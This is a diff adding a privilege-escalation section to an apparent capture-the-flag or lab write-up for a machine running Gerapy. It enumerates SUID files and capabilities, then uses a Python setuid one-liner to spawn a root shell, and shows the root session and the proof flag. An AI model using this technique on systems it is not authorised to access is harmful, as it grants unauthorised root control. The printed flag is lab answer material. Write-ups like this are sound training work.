@@ -91,8 +91,43 @@ cat local.txt
 
 # Privilege Escalation
 
+For  escalation we check the available SUID files for any available escalations. 
+
+		find / -type f -perm -4000 2>/dev/null
+
+From the search, we return not immediate escalations that stick out. 
+
+However, when checking the available capabilities on the machine, we find Python with a setuid:
+
+		getcap -r 2>/dev/null
+
+Using GTFOBins, we can directly implement an escalation technique for opening a root shell with our currently granted accesses:
+
+		/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 
+With some success, we are able to get a blank root shell access and open a root shell by directly calling, "bin -i"
+
+Output:
+<c 'import os; os.setuid(0); os.system("/bin/bash")'
+whoami
+root
+bash -i
+bash: cannot set terminal process group (845): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ubuntu:~/gerapy# cd /root 
+cd /root
+root@ubuntu:/root# ls           
+ls
+email3.txt
+proof.txt
+snap
+root@ubuntu:/root# cat proof.txt
+cat proof.txt
+==c9e7682c9d62c67a57d9627523c527d3==
+
+
+We have now successfully solved the machine!
 
 
 
